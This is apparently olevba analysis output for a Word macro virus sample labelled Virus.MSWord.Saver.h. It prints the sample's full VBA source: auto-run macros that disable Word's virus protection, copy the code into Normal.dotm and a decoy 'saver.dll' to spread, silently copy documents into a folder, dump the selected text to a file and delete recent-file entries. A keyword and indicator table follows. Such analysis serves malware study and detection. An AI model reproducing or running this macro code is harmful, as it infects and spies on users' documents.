olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Saver.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Saver.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Saver.bas 
in file: ./Virus.MSWord.Saver.h - OLE stream: 'Macros/VBA/Saver'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoC()
Dim strString As String
Dim intFileDescr As Integer

strString = Selection
intFileDescr = FreeFile

Open "C:\WinWord.txt" For Output As intFileDescr
Write #intFileDescr, strString
Close intFileDescr

End Sub



Sub Mac(dr)
Attribute Mac.VB_Description = "Макрос записан 02.02.00 КОНОТОП"
Attribute Mac.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Макрос1"
 If (Dir(dr, vbDirectory) = "") Then MkDir (dr)
End Sub
Sub Setup()
  Word.Options.VirusProtection = False
  On Error Resume Next
  
  If Word.ActiveDocument.name = "saver.dll" Then MsgBox "Saver!"
    
  zz = Word.ActiveDocument.FullName
  
  Application.OrganizerCopy Source:=zz, _
      Destination:=Normal.ThisDocument.FullName, name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
      
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=zz, name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
      
  yy = Word.Application.Path + "\saver.dll"
  
  If (Dir(yy) = "") Then
    Application.Documents.Add
    Application.Documents(1).SaveAs (yy)
    Application.Documents(1).Close SaveChanges:=False
    Word.RecentFiles.Item(1).Delete
  End If
  
  
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=yy, name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=zz, _
      Destination:=yy, name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=yy, _
      Destination:=zz, name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
      
End Sub
Sub AutoNew()
  dr = Word.Application.Path + "\Doc_Copy"
  Mac (dr)
End Sub
Sub AutoOpen()
  Setup
  dr = Word.Application.Path + "\Doc_Copy"
  Mac (dr)
  If Word.ActiveDocument.name = "saver.dll" Then Word.ActiveDocument.Close
End Sub
Sub AutoClose()
  dr = Word.Application.Path + "\Doc_Copy"
  Pat = dr + "\" + ActiveDocument.name
  If Word.ActiveDocument.name <> "saver.dll" Then
    On Error Resume Next
    ActiveDocument.Saved = False
    ActiveDocument.Save
    ActiveDocument.SaveAs (Pat)
  End If
  Word.RecentFiles.Item(1).Delete
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |saver.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

